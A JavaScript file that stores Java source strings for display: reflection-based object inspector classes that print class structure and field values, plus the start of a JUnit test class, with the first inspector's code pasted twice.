var codeStore = {
	ins: {
		type: 'java',
		code: `
		import java.lang.reflect.*;
		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.LinkedList;
		import java.util.List;

		public class Inspector{

		    static final String[] PRIMITIVE_TYPE_NAMES = {"byte", "int", "short","long","boolean","double","float","char"};
		    static LinkedList &ltObject&gt checked_things = new LinkedList&lt&gt();


		    public void inspect(Object obj, boolean recursive){
		        if(obj == null){
		            //System.out.println("    Cannot inspect a null object");
		            return;
		        }
		        if(checked_things.contains(obj)){
		            System.out.println("#### ALREADY INSPECTED " + obj + ". CONTINUING... ####");
		            return;
		        }
		        System.out.println("#### Currently Inspecting: " + obj + " with recursive set to: " + recursive + " ####\\n");

		        LinkedList toCheckRecursively = new LinkedList();
		        Class classObj = obj.getClass();

		        if(!classObj.isArray()){

		            inspectNonArray(classObj, obj, toCheckRecursively);

		            if(classObj.getSuperclass() != null){

		                inspectSuperClassDetails(classObj, obj, toCheckRecursively);
		            }
		            if(classObj.isInterface()) {
		                Class[] interf = classObj.getInterfaces();

		                for (int i = 0; i &lt interf.length; i++) {
		                    inspectSuperInterfaces(classObj, interf[i], toCheckRecursively);
		                }

		            }
		            if(recursive){
		                System.out.println("#### Inspecting Recursive Fields & Objects for: " + obj + " ####");

		                recursiveInspection(obj, recursive, toCheckRecursively);
		            }
		            checked_things.add(obj);
		        }
		        else{
		            inspectArray(obj, recursive);
		        }
		    }

		    private void inspectArray(Object obj, boolean recursive) {
		        boolean skipPrimitive = false;
		        Class componentName = obj.getClass().getComponentType();
		        for(int j = 0; j &lt PRIMITIVE_TYPE_NAMES.length ; j++) {
		            if (PRIMITIVE_TYPE_NAMES[j].equals(componentName.getName())) {
		                // we have an array of primitive type
		                System.out.print("    FOUND PRIMITIVE ARRAY OF TYPE: " + componentName + " WITH VALUES: {");
		                ArrayList&ltString&gt foundPrimitives = new ArrayList&lt&gt();
		                for (int i = 0; i &lt Array.getLength(obj); i++) {
		                    foundPrimitives.add(""  + Array.get(obj, i));
		                }
		                System.out.println(String.join(",", foundPrimitives) + "}\\n\\n");

		                skipPrimitive = true;
		            }
		        }
		        if(!skipPrimitive) {
		            for(int i = 0; i &lt Array.getLength(obj); i++) {
		                inspect(Array.get(obj, i), recursive);
		            }
		        }
		    }

		    private void inspectSuperInterfaces(Class classObj, Class interf, LinkedList toCheckRecursively) {
		        String supersMethods = inspectMethods(interf);
		        String supersConstructors = inspectConstructors(interf);
		        String supersFields = inspectFields(interf, classObj, toCheckRecursively);

		        printInterfaceDetails(interf, supersMethods, supersConstructors, supersFields);
		    }

		    private void inspectSuperClassDetails(Class classObj, Object obj, LinkedList toCheckRecursively) {
		        String supersMethods = inspectMethods(classObj.getSuperclass());
		        String supersConstructors = inspectConstructors(classObj.getSuperclass());
		        String supersFields = inspectFields(classObj.getSuperclass(), classObj, toCheckRecursively);

		        printSuperClassDetails(classObj, supersMethods, supersConstructors, supersFields);
		    }

		    private void inspectNonArray(Class classObj, Object obj, LinkedList toCheckRecursively) {
		        String declaringClass = inspectDeclaringClass(classObj);
		        String immediateSuperClass = inspectImmediateSuperClass(classObj);
		        String className = classObj.getName();
		        String interfaces = inspectInterfaces(classObj);
		        String methods = inspectMethods(classObj);
		        String constructors = inspectConstructors(classObj);
		        String fields = inspectFields(classObj, obj, toCheckRecursively);

		        printClassObjDetails(declaringClass, immediateSuperClass, className, interfaces, methods, constructors, fields);
		    }

		    private void printInterfaceDetails(Class interf, String supersMethods, String supersConstructors, String supersFields) {
		        System.out.println("#### Inspecting SuperInterface ####\\n");
		        System.out.println("#### Inspecting SuperInterface Methods ####");
		        System.out.println("    Methods for " + interf.getName() + " are: \\n         " + supersMethods + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Constructors ####");
		        System.out.println("    Constructors for " + interf.getName() + " are: \\n     " + supersConstructors + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Fields ####");
		        System.out.println("    Fields for " + interf.getName() + " are: " + supersFields + "\\n\\n");
		    }

		    private void printSuperClassDetails(Class classObj, String supersMethods, String supersConstructors, String supersFields) {
		        System.out.println("#### Inspecting SuperClass ####\\n");
		        System.out.println("#### Inspecting SuperClass Methods ####");
		        System.out.println("    Methods for " + classObj.getSuperclass().getName() + " are: \\n         " + supersMethods + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Constructors ####");
		        System.out.println("    Constructors for " + classObj.getSuperclass().getName() + " are: \\n         " + supersConstructors + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Fields ####");
		        System.out.println("    Fields for " + classObj.getSuperclass().getName() + " are: " + supersFields + "\\n\\n");
		    }

		    private void printClassObjDetails(String declaringClass, String immediateSuperClass, String className, String interfaces, String methods, String constructors, String fields) {
		        System.out.println("#### Inspecting Declaring Class ####");
		        System.out.println("    Declaring Class for " + className + " is: " + declaringClass + "\\n\\n");
		        System.out.println("#### Inspecting Super Class ####");
		        System.out.println("    Super Class for " + className + " is: " + immediateSuperClass + "\\n\\n");
		        System.out.println("#### Inspecting Interfaces ####");
		        System.out.println("    Interfaces for " + className + " are: " + interfaces + "\\n\\n");
		        System.out.println("#### Inspecting Methods ####");
		        System.out.println("    Methods for " + className + " are: \\n         " + methods + "\\n\\n");
		        System.out.println("#### Inspecting Constructors ####");
		        System.out.println("    Constructors for " + className + " are: \\n         " + constructors + "\\n\\n");
		        System.out.println("#### Inspecting Fields ####");
		        System.out.println("    Fields for " + className + " are: \\n         " + fields + "\\n\\n");
		    }

		    public void recursiveInspection(Object obj, boolean recursive, LinkedList toCheckRecursively){
		        if(toCheckRecursively.size() == 0){
		            System.out.println("    Nothing to inspect. Continuing...");
		            return;
		        }
		        for(int i = 0; i &lt toCheckRecursively.size(); i++){
		            Field field = (Field) toCheckRecursively.get(i);
		            field.setAccessible(true);
		            System.out.println("    #### Currently inspecting " + field.getName() + " ####\\n");
		            try {
		                inspect(field.get(obj), recursive);
		                checked_things.add(obj);
		            }
		            catch(NullPointerException e){
		                System.out.println("    COULD NOT GET NULL FROM OBJECT. CONTINUING...");
		            }
		            catch(IllegalAccessException e){
		                System.out.println("    COULD NOT ACCESS FIELD FROM OBJECT. CONTINUING...");
		            }
		        }
		    }

		    public String inspectFields(Class classObj, Object obj, LinkedList toCheckRecursively){
		        String fieldsResult = "";
		        Field[] fields = classObj.getDeclaredFields();
		        for(int i = 0; i &lt fields.length; i++){
		            fields[i].setAccessible(true);
		            if(!fields[i].getType().isPrimitive() && fields[i] != null){
		                toCheckRecursively.add(fields[i]);
		            }
		            String type = fields[i].getType().getName();
		            String modifier = Modifier.toString(fields[i].getModifiers());
		            fieldsResult = fieldsResult + "\\n";
		            fieldsResult = fieldsResult + "         " + fields[i].getName() + "\\n";
		            fieldsResult = fieldsResult + "             type: " + type + "\\n";
		            fieldsResult = fieldsResult + "             modifiers: " + modifier + "\\n";
		            try {
		                fieldsResult = fieldsResult + "             value: " + fields[i].get(obj);
		            }
		            catch(Exception e){
		                fieldsResult = fieldsResult + "             Could not get value due to permissions";
		            }
		            if(fields[i].getType().isArray()){
		                fieldsResult = fieldsResult + "\\n";
		                fieldsResult = fieldsResult + "         " + fields[i].getName() + " is an array with the following properties: \\n";
		                fieldsResult = fieldsResult + "             Contains Type: " + fields[i].getType().getComponentType().getName() + "\\n";
		                try {
		                    fieldsResult = fieldsResult + "             Length: " + Array.getLength(fields[i].get(obj)) +"\\n";
		                }
		                catch (Exception e){
		                    fieldsResult = fieldsResult + "             Could not access length\\n";
		                }
		                fieldsResult = fieldsResult + "             Elements: {";
		                try {
		                    for (int j = 0; j &lt Array.getLength(fields[i].get(obj)); j++) {
		                        Object ele = Array.get(fields[i].get(obj), j);
		                        fieldsResult = fieldsResult + ele + ", ";

		                    }
		                    if(Array.getLength(fields[i].get(obj)) != 0){
		                        fieldsResult = fieldsResult.trim();
		                        fieldsResult = fieldsResult.substring(0, fieldsResult.length() - 1);
		                    }
		                    fieldsResult = fieldsResult + "}";

		                }
		                catch(IllegalArgumentException e){
		                    e.printStackTrace();
		                    fieldsResult = fieldsResult + "Expected Array: got type " + fields[i].getType() + "}".toUpperCase();
		                }
		                catch(IllegalAccessException e){
		                    fieldsResult = fieldsResult + "Could not access elements}".toUpperCase();
		                }
		            }
		        }

		        return fieldsResult;
		    }

		    public String inspectConstructors(Class classObj){
		        String constrResult = "";
		        Constructor[] cArr = classObj.getConstructors();
		        for(int i = 0; i &lt cArr.length; i++){
		            cArr[i].setAccessible(true);
		            Class[] params = cArr[i].getParameterTypes();
		            String modifies = Modifier.toString(cArr[i].getModifiers());
		            constrResult = constrResult + "\\n";
		            constrResult = constrResult + "         " + cArr[i].getName() + "(";
		            for(int j = 0; j &lt params.length; j++){
		                constrResult = constrResult + params[j].getName() + ", ";
		            }
		            if(params.length != 0){
		                constrResult = constrResult.trim();
		                constrResult = constrResult.substring(0, constrResult.length() - 1);
		            }
		            constrResult = constrResult + ")\\n";
		            constrResult = constrResult + "           with modifiers: " + modifies;
		        }

		        return constrResult;
		    }

		    public String inspectMethods(Class classObj){
		        String methodsResult = "";
		        Method[] mArr = classObj.getMethods();
		        for(int i = 0; i &lt mArr.length; i++){
		            mArr[i].setAccessible(true);
		            Class[] execps = mArr[i].getExceptionTypes();
		            Class[] params = mArr[i].getParameterTypes();
		            Class rtype = mArr[i].getReturnType();
		            String modifies = Modifier.toString(mArr[i].getModifiers());
		            methodsResult = methodsResult + "\\n";
		            methodsResult = methodsResult + "         " + mArr[i].getName() + "\\n";
		            methodsResult = methodsResult + "             exceptions: ";
		            for(int j = 0; j &lt execps.length; j++){
		                methodsResult = methodsResult + execps[j].getName() + ", ";
		            }
		            if (execps.length != 0) {
		                methodsResult = methodsResult.trim();
		                methodsResult = methodsResult.substring(0, methodsResult.length() - 1);
		            }
		            methodsResult = methodsResult + "\\n             parameters: ";
		            for(int j = 0; j &lt params.length; j++){
		                methodsResult = methodsResult + params[j].getName() + ", ";
		            }
		            if(params.length != 0){
		                methodsResult = methodsResult.trim();
		                methodsResult = methodsResult.substring(0, methodsResult.length() - 1);
		            }
		            methodsResult = methodsResult + "\\n             return type: ";
		            methodsResult = methodsResult + rtype.getName();
		            methodsResult = methodsResult + "\\n             modifiers: ";
		            methodsResult = methodsResult + modifies;
		        }

		        return methodsResult;
		    }

		    public String inspectInterfaces(Class classObj) {
		        Class[] interArr = classObj.getInterfaces();
		        String interfaceResult = "";
		        if(interArr.length &lt 1){
		            return "No implemented interfaces";
		        }
		        else{
		            for(int i = 0; i &lt interArr.length; i++){
		                interfaceResult = interfaceResult + interArr[i].getName() + ", ";
		            }
		            interfaceResult = interfaceResult.trim();
		            interfaceResult = interfaceResult.substring(0, interfaceResult.length() - 1);
		            return interfaceResult;
		        }
		    }

		    public String inspectDeclaringClass(Class classObj){
		        return classObj.getName();
		    }

		    public String inspectImmediateSuperClass(Class classObj){
		        return classObj.getSuperclass().getName();
		    }
		}import java.lang.reflect.*;
		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.LinkedList;
		import java.util.List;

		public class Inspector{

		    static final String[] PRIMITIVE_TYPE_NAMES = {"byte", "int", "short","long","boolean","double","float","char"};
		    static LinkedList &ltObject&gt checked_things = new LinkedList&lt&gt();


		    public void inspect(Object obj, boolean recursive){
		        if(obj == null){
		            //System.out.println("    Cannot inspect a null object");
		            return;
		        }
		        if(checked_things.contains(obj)){
		            System.out.println("#### ALREADY INSPECTED " + obj + ". CONTINUING... ####");
		            return;
		        }
		        System.out.println("#### Currently Inspecting: " + obj + " with recursive set to: " + recursive + " ####\\n");

		        LinkedList toCheckRecursively = new LinkedList();
		        Class classObj = obj.getClass();

		        if(!classObj.isArray()){

		            inspectNonArray(classObj, obj, toCheckRecursively);

		            if(classObj.getSuperclass() != null){

		                inspectSuperClassDetails(classObj, obj, toCheckRecursively);
		            }
		            if(classObj.isInterface()) {
		                Class[] interf = classObj.getInterfaces();

		                for (int i = 0; i &lt interf.length; i++) {
		                    inspectSuperInterfaces(classObj, interf[i], toCheckRecursively);
		                }

		            }
		            if(recursive){
		                System.out.println("#### Inspecting Recursive Fields & Objects for: " + obj + " ####");

		                recursiveInspection(obj, recursive, toCheckRecursively);
		            }
		            checked_things.add(obj);
		        }
		        else{
		            inspectArray(obj, recursive);
		        }
		    }

		    private void inspectArray(Object obj, boolean recursive) {
		        boolean skipPrimitive = false;
		        Class componentName = obj.getClass().getComponentType();
		        for(int j = 0; j &lt PRIMITIVE_TYPE_NAMES.length ; j++) {
		            if (PRIMITIVE_TYPE_NAMES[j].equals(componentName.getName())) {
		                // we have an array of primitive type
		                System.out.print("    FOUND PRIMITIVE ARRAY OF TYPE: " + componentName + " WITH VALUES: {");
		                ArrayList&ltString&gt foundPrimitives = new ArrayList&lt&gt();
		                for (int i = 0; i &lt Array.getLength(obj); i++) {
		                    foundPrimitives.add(""  + Array.get(obj, i));
		                }
		                System.out.println(String.join(",", foundPrimitives) + "}\\n\\n");

		                skipPrimitive = true;
		            }
		        }
		        if(!skipPrimitive) {
		            for(int i = 0; i &lt Array.getLength(obj); i++) {
		                inspect(Array.get(obj, i), recursive);
		            }
		        }
		    }

		    private void inspectSuperInterfaces(Class classObj, Class interf, LinkedList toCheckRecursively) {
		        String supersMethods = inspectMethods(interf);
		        String supersConstructors = inspectConstructors(interf);
		        String supersFields = inspectFields(interf, classObj, toCheckRecursively);

		        printInterfaceDetails(interf, supersMethods, supersConstructors, supersFields);
		    }

		    private void inspectSuperClassDetails(Class classObj, Object obj, LinkedList toCheckRecursively) {
		        String supersMethods = inspectMethods(classObj.getSuperclass());
		        String supersConstructors = inspectConstructors(classObj.getSuperclass());
		        String supersFields = inspectFields(classObj.getSuperclass(), classObj, toCheckRecursively);

		        printSuperClassDetails(classObj, supersMethods, supersConstructors, supersFields);
		    }

		    private void inspectNonArray(Class classObj, Object obj, LinkedList toCheckRecursively) {
		        String declaringClass = inspectDeclaringClass(classObj);
		        String immediateSuperClass = inspectImmediateSuperClass(classObj);
		        String className = classObj.getName();
		        String interfaces = inspectInterfaces(classObj);
		        String methods = inspectMethods(classObj);
		        String constructors = inspectConstructors(classObj);
		        String fields = inspectFields(classObj, obj, toCheckRecursively);

		        printClassObjDetails(declaringClass, immediateSuperClass, className, interfaces, methods, constructors, fields);
		    }

		    private void printInterfaceDetails(Class interf, String supersMethods, String supersConstructors, String supersFields) {
		        System.out.println("#### Inspecting SuperInterface ####\\n");
		        System.out.println("#### Inspecting SuperInterface Methods ####");
		        System.out.println("    Methods for " + interf.getName() + " are: \\n         " + supersMethods + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Constructors ####");
		        System.out.println("    Constructors for " + interf.getName() + " are: \\n     " + supersConstructors + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Fields ####");
		        System.out.println("    Fields for " + interf.getName() + " are: " + supersFields + "\\n\\n");
		    }

		    private void printSuperClassDetails(Class classObj, String supersMethods, String supersConstructors, String supersFields) {
		        System.out.println("#### Inspecting SuperClass ####\\n");
		        System.out.println("#### Inspecting SuperClass Methods ####");
		        System.out.println("    Methods for " + classObj.getSuperclass().getName() + " are: \\n         " + supersMethods + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Constructors ####");
		        System.out.println("    Constructors for " + classObj.getSuperclass().getName() + " are: \\n         " + supersConstructors + "\\n\\n");
		        System.out.println("#### Inspecting SuperClass Fields ####");
		        System.out.println("    Fields for " + classObj.getSuperclass().getName() + " are: " + supersFields + "\\n\\n");
		    }

		    private void printClassObjDetails(String declaringClass, String immediateSuperClass, String className, String interfaces, String methods, String constructors, String fields) {
		        System.out.println("#### Inspecting Declaring Class ####");
		        System.out.println("    Declaring Class for " + className + " is: " + declaringClass + "\\n\\n");
		        System.out.println("#### Inspecting Super Class ####");
		        System.out.println("    Super Class for " + className + " is: " + immediateSuperClass + "\\n\\n");
		        System.out.println("#### Inspecting Interfaces ####");
		        System.out.println("    Interfaces for " + className + " are: " + interfaces + "\\n\\n");
		        System.out.println("#### Inspecting Methods ####");
		        System.out.println("    Methods for " + className + " are: \\n         " + methods + "\\n\\n");
		        System.out.println("#### Inspecting Constructors ####");
		        System.out.println("    Constructors for " + className + " are: \\n         " + constructors + "\\n\\n");
		        System.out.println("#### Inspecting Fields ####");
		        System.out.println("    Fields for " + className + " are: \\n         " + fields + "\\n\\n");
		    }

		    public void recursiveInspection(Object obj, boolean recursive, LinkedList toCheckRecursively){
		        if(toCheckRecursively.size() == 0){
		            System.out.println("    Nothing to inspect. Continuing...");
		            return;
		        }
		        for(int i = 0; i &lt toCheckRecursively.size(); i++){
		            Field field = (Field) toCheckRecursively.get(i);
		            field.setAccessible(true);
		            System.out.println("    #### Currently inspecting " + field.getName() + " ####\\n");
		            try {
		                inspect(field.get(obj), recursive);
		                checked_things.add(obj);
		            }
		            catch(NullPointerException e){
		                System.out.println("    COULD NOT GET NULL FROM OBJECT. CONTINUING...");
		            }
		            catch(IllegalAccessException e){
		                System.out.println("    COULD NOT ACCESS FIELD FROM OBJECT. CONTINUING...");
		            }
		        }
		    }

		    public String inspectFields(Class classObj, Object obj, LinkedList toCheckRecursively){
		        String fieldsResult = "";
		        Field[] fields = classObj.getDeclaredFields();
		        for(int i = 0; i &lt fields.length; i++){
		            fields[i].setAccessible(true);
		            if(!fields[i].getType().isPrimitive() && fields[i] != null){
		                toCheckRecursively.add(fields[i]);
		            }
		            String type = fields[i].getType().getName();
		            String modifier = Modifier.toString(fields[i].getModifiers());
		            fieldsResult = fieldsResult + "\\n";
		            fieldsResult = fieldsResult + "         " + fields[i].getName() + "\\n";
		            fieldsResult = fieldsResult + "             type: " + type + "\\n";
		            fieldsResult = fieldsResult + "             modifiers: " + modifier + "\\n";
		            try {
		                fieldsResult = fieldsResult + "             value: " + fields[i].get(obj);
		            }
		            catch(Exception e){
		                fieldsResult = fieldsResult + "             Could not get value due to permissions";
		            }
		            if(fields[i].getType().isArray()){
		                fieldsResult = fieldsResult + "\\n";
		                fieldsResult = fieldsResult + "         " + fields[i].getName() + " is an array with the following properties: \\n";
		                fieldsResult = fieldsResult + "             Contains Type: " + fields[i].getType().getComponentType().getName() + "\\n";
		                try {
		                    fieldsResult = fieldsResult + "             Length: " + Array.getLength(fields[i].get(obj)) +"\\n";
		                }
		                catch (Exception e){
		                    fieldsResult = fieldsResult + "             Could not access length\\n";
		                }
		                fieldsResult = fieldsResult + "             Elements: {";
		                try {
		                    for (int j = 0; j &lt Array.getLength(fields[i].get(obj)); j++) {
		                        Object ele = Array.get(fields[i].get(obj), j);
		                        fieldsResult = fieldsResult + ele + ", ";

		                    }
		                    if(Array.getLength(fields[i].get(obj)) != 0){
		                        fieldsResult = fieldsResult.trim();
		                        fieldsResult = fieldsResult.substring(0, fieldsResult.length() - 1);
		                    }
		                    fieldsResult = fieldsResult + "}";

		                }
		                catch(IllegalArgumentException e){
		                    e.printStackTrace();
		                    fieldsResult = fieldsResult + "Expected Array: got type " + fields[i].getType() + "}".toUpperCase();
		                }
		                catch(IllegalAccessException e){
		                    fieldsResult = fieldsResult + "Could not access elements}".toUpperCase();
		                }
		            }
		        }

		        return fieldsResult;
		    }

		    public String inspectConstructors(Class classObj){
		        String constrResult = "";
		        Constructor[] cArr = classObj.getConstructors();
		        for(int i = 0; i &lt cArr.length; i++){
		            cArr[i].setAccessible(true);
		            Class[] params = cArr[i].getParameterTypes();
		            String modifies = Modifier.toString(cArr[i].getModifiers());
		            constrResult = constrResult + "\\n";
		            constrResult = constrResult + "         " + cArr[i].getName() + "(";
		            for(int j = 0; j &lt params.length; j++){
		                constrResult = constrResult + params[j].getName() + ", ";
		            }
		            if(params.length != 0){
		                constrResult = constrResult.trim();
		                constrResult = constrResult.substring(0, constrResult.length() - 1);
		            }
		            constrResult = constrResult + ")\\n";
		            constrResult = constrResult + "           with modifiers: " + modifies;
		        }

		        return constrResult;
		    }

		    public String inspectMethods(Class classObj){
		        String methodsResult = "";
		        Method[] mArr = classObj.getMethods();
		        for(int i = 0; i &lt mArr.length; i++){
		            mArr[i].setAccessible(true);
		            Class[] execps = mArr[i].getExceptionTypes();
		            Class[] params = mArr[i].getParameterTypes();
		            Class rtype = mArr[i].getReturnType();
		            String modifies = Modifier.toString(mArr[i].getModifiers());
		            methodsResult = methodsResult + "\\n";
		            methodsResult = methodsResult + "         " + mArr[i].getName() + "\\n";
		            methodsResult = methodsResult + "             exceptions: ";
		            for(int j = 0; j &lt execps.length; j++){
		                methodsResult = methodsResult + execps[j].getName() + ", ";
		            }
		            if (execps.length != 0) {
		                methodsResult = methodsResult.trim();
		                methodsResult = methodsResult.substring(0, methodsResult.length() - 1);
		            }
		            methodsResult = methodsResult + "\\n             parameters: ";
		            for(int j = 0; j &lt params.length; j++){
		                methodsResult = methodsResult + params[j].getName() + ", ";
		            }
		            if(params.length != 0){
		                methodsResult = methodsResult.trim();
		                methodsResult = methodsResult.substring(0, methodsResult.length() - 1);
		            }
		            methodsResult = methodsResult + "\\n             return type: ";
		            methodsResult = methodsResult + rtype.getName();
		            methodsResult = methodsResult + "\\n             modifiers: ";
		            methodsResult = methodsResult + modifies;
		        }

		        return methodsResult;
		    }

		    public String inspectInterfaces(Class classObj) {
		        Class[] interArr = classObj.getInterfaces();
		        String interfaceResult = "";
		        if(interArr.length &lt 1){
		            return "No implemented interfaces";
		        }
		        else{
		            for(int i = 0; i &lt interArr.length; i++){
		                interfaceResult = interfaceResult + interArr[i].getName() + ", ";
		            }
		            interfaceResult = interfaceResult.trim();
		            interfaceResult = interfaceResult.substring(0, interfaceResult.length() - 1);
		            return interfaceResult;
		        }
		    }

		    public String inspectDeclaringClass(Class classObj){
		        return classObj.getName();
		    }

		    public String inspectImmediateSuperClass(Class classObj){
		        return classObj.getSuperclass().getName();
		    }
		}`
	},
	ri:{
		type: 'java',
		code: `
		import java.lang.reflect.*;
		import java.util.ArrayList;
		import java.util.LinkedList;
		import java.util.List;

		public class ReflectiveInspector {

		        public List<String> already_visited_class = new ArrayList<>();

		        public void inspect(Object obj, boolean recursive) throws IllegalAccessException {
		            if(obj == null){
		                System.out.println("Cannot operate on a NULL object. Exiting now...");
		                return;
		            }
		            LinkedList recursiveList = new LinkedList();
		            Class classObj = obj.getClass();
		            if(already_visited_class.contains(classObj.getTypeName())){
		                return;
		            }
		            System.out.println("Currently inspecting object of type: " + classObj.getTypeName());
		            System.out.println("Recursive option is set to: " + recursive);

		            if(classObj.isPrimitive()){
		                System.out.println("Currently inspecting primitive object: " + classObj.getTypeName());
		                //Do Some work
		            }
		            else if(!classObj.isArray()){
		                System.out.println("Declaring Class: " + getDeclaringClass(classObj));

		                getInterface(obj,classObj, recursiveList, recursive);
		                getMethods(classObj);
		                getConstructors(classObj);
		                getFields(obj,classObj, recursiveList, recursive);
		                getFieldValue(classObj);
		                already_visited_class.add(classObj.getTypeName());
		                if(recursiveList.size() > 0){
		                    getRecursive(obj,classObj, recursiveList, recursive);
		                }

		                if(recursive){
		                    if(classObj.isPrimitive()){
		                        recursive = false;
		                    }
		                    getRecursive(obj,classObj, recursiveList, recursive);
		                }
		            }
		            else{
		                for(int i = 0; i < Array.getLength(obj); i++){
		                /*Have to do this recursively because we need to go through every element of the array (Which could
		                also be an array, but we have no way of knowing until runtime)
		                 */
		                    inspect(Array.get(obj, i), recursive);
		                }
		            }

		        }

		        public void getRecursive(Object obj,Class classObj, LinkedList recursiveList, boolean recursive) throws IllegalAccessException {
		            if(recursiveList.size() == 0){ return;}
		            System.out.println("Recursively inspecting: " + classObj.getName());
		            for(int i = 0; i < recursiveList.size(); i++){
		                Field f = (Field) recursiveList.get(i);
		                System.out.println("    Lets deep dive into: " + f.getName());
		                if(recursive){
		                    inspect(f.get(obj), recursive);
		                }

		            }
		        }

		        public void getMethods(Class classObj){
		            Method[] mArr= classObj.getMethods();
		            System.out.println("Methods of " + classObj.getName() + " are: ");
		            for(int i = 0; i < mArr.length; i++){
		                System.out.println("    " + mArr[i].getName());
		            }
		            System.out.println("\\n\\n");
		            for(int i = 0; i < mArr.length; i++){
		                Method method = mArr[i];
		                System.out.println("    " + method.getName() + " has the following exceptions: ");
		                for(int j = 0; j < method.getExceptionTypes().length; j++){
		                    System.out.println("        " + method.getExceptionTypes()[j].getName());
		                }
		                System.out.println("    " + method.getName() + " has the following parameter types: ");
		                for(int j = 0; j < method.getParameters().length; j++){
		                    System.out.println("        " + method.getParameters()[j].getParameterizedType());
		                }
		                System.out.println("    " + method.getName() + " has the following return type: " + method.getReturnType());
		                System.out.println("    " + method.getName() + " has the following modifiers: " + Modifier.toString(method.getModifiers()));
		                System.out.print("\\n\\n");
		            }
		        }

		        public void getConstructors(Class classObj){
		            Constructor[] conArr = classObj.getConstructors();
		            System.out.println("Constructors of " + classObj.getName() + " are: ");
		            for(int i = 0; i < conArr.length; i++){
		                System.out.println("    " + conArr[i].getName() + "(" + conArr[i].getParameterCount()+ ")");
		            }
		            System.out.println("\\n");
		            for(int i = 0; i < conArr.length; i++){
		                Constructor constructor = conArr[i];
		                System.out.println("    " + constructor.getName()+ "(" + conArr[i].getParameterCount()+ ")" + " has the following parameter types: ");
		                for(int j = 0; j < constructor.getParameters().length; j++){
		                    System.out.println("        " + constructor.getParameters()[j].getParameterizedType());
		                }
		                System.out.println("    " + constructor.getName()+ "(" + conArr[i].getParameterCount()+ ")" + " has the following modifiers: " + Modifier.toString(constructor.getModifiers()));
		                System.out.println("\\n");
		            }
		        }

		        public void getFields(Object obj, Class classObj, LinkedList recursiveList, boolean recursive) throws IllegalAccessException {
		            Field[] fArr = classObj.getDeclaredFields();
		            System.out.println("Fields of " + classObj.getName() + " are: ");
		            if( fArr == null){
		                return;
		            }
		            for(int i = 0; i < fArr.length; i++){
		                Field field= fArr[i];
		                if(field == null){ continue;}
		                try {
		                    field.setAccessible(true);
		                    if (!field.getType().isPrimitive()) {
		                        recursiveList.add(field);
		                    }
		                    System.out.println("    " + field.getName());
		                    System.out.println("        " + field.getName() + " has the following type: " + field.getType().getName());
		                    System.out.println("        " + field.getName() + " has the following modifiers: " + Modifier.toString(field.getModifiers()));
		                    if (field.getType() == null && !recursive) {
		                        System.out.println("        " + field.getName() + " is a reference with value: " + field.getClass() + field.hashCode());
		                    } else {
		                        System.out.println("        " + field.getName() + " has value of: " + field.get(obj));
		                    }
		                    if (field.getType().isArray() && field.get(obj) != null) {
		                        System.out.println("        " + field.getName() + " is an array with the following properties: ");
		                        System.out.println("            Length: " + Array.getLength(field.get(obj)));
		                        System.out.println("            Contains type: " + field.getType().getComponentType().getName());
		                        System.out.println("            Elements: ");
		                        for (int j = 0; j < Array.getLength(field.get(obj)); j++) {
		                            System.out.println("                " + Array.get(field.get(obj), j));
		                        }
		                    }
		                }
		                catch(InaccessibleObjectException e){
		                    System.out.println("Unable to access" + field.getName() + ". Continuing...");
		                }

		            }
		        }

		        public void getFieldValue(Class classObj){
		            return;
		        }

		        public void getInterface(Object obj,Class classObj, LinkedList recursiveList, boolean recursive) throws IllegalAccessException {
		            Class[] cArr = classObj.getInterfaces();
		            if(!classObj.isInterface()){
		                System.out.println("Implemented Interfaces: ");
		                for(int i = 0; i < cArr.length; i++){
		                    System.out.println("    " + cArr[i].getName());
		                }
		            }
		            else{
		                for(int i = 0; i < cArr.length; i++){
		                    getMethods(cArr[i]);
		                    getConstructors(cArr[i]);
		                    getFields(obj,cArr[i], recursiveList, recursive);
		                    getFieldValue(cArr[i]);
		                }
		            }
		        }

		        public void getImmSuperClass(Object obj,Class classObj, LinkedList recursiveList, boolean recursive) throws IllegalAccessException {
		            Class superc = classObj.getSuperclass();
		            System.out.println("Immediate Superclass: " + superc.getName());
		            System.out.println("Superclass has the following properties: ");
		            if(superc != null) {
		                getMethods(superc);
		                getConstructors(superc);
		                getFields(obj,superc, recursiveList, recursive);
		                getFieldValue(superc);
		            }
		        }

		        public String getDeclaringClass(Class classObj) {
		            return classObj.getName();
		        }
		}`
	},
	it: {
		type: 'java',
		code: `
		import org.junit.After;
		import org.junit.Before;
		import org.junit.jupiter.api.Test;
		import java.io.ByteArrayOutputStream;
		import java.io.PrintStream;
		import java.lang.reflect.*;
		import java.util.LinkedList;

		import static org.hamcrest.core.StringStartsWith.startsWith;
		import static org.junit.jupiter.api.Assertions.*;


		class InspectorTest {
		    int[] intArr = {1,2,3,4};
		    int[][] intArr2D = {{1,2,3},{4,5,6}};
		    byte[] byteArr = {80, 101, 32, 45, 76};
		    Object[] objArr = {3, "Hello", 1.0, 3.1415927892837848, intArr, intArr2D, byteArr};
		    Inspector ins = new Inspector();
		    @Test
		    void testDeclaringClass() {
		        for(int i = 0; i < objArr.length; i++){
		            assertEquals(objArr[i].getClass().getName(), ins.inspectDeclaringClass(objArr[i].getClass()));
		        }
		    }

		    @Test
		    void testSuperClass() {
		        for(int i = 0; i < objArr.length; i++){
		            assertEquals(objArr[i].getClass().getSuperclass().getName(), ins.inspectImmediateSuperClass(objArr[i].getClass()));
		        }
		    }

		    @Test
		    void testInterfaces() {
		        for(int i = 0; i < objArr.length; i++){
		            String result = "";
		            Class[] interArr = objArr[i].getClass().getInterfaces();
		            for(int j = 0; j < interArr.length; j++) {
		                result = result + interArr[j].getName() + ", ";
		            }
		                result = result.trim();
		                result = result.substring(0, result.length() - 1);
		                assertEquals(result, ins.inspectInterfaces(objArr[i].getClass()));
		        }
		    }

		    @Test
		    void testMethods() {
		        for(int i = 0; i < objArr.length; i++){
		            String result = "";
		            Method[] mArr = objArr[i].getClass().getMethods();
		            for(int x = 0; x < mArr.length; x++) {
		                Class[] execps = mArr[x].getExceptionTypes();
		                Class[] params = mArr[x].getParameterTypes();
		                Class rtype = mArr[x].getReturnType();
		                String modifies = Modifier.toString(mArr[x].getModifiers());
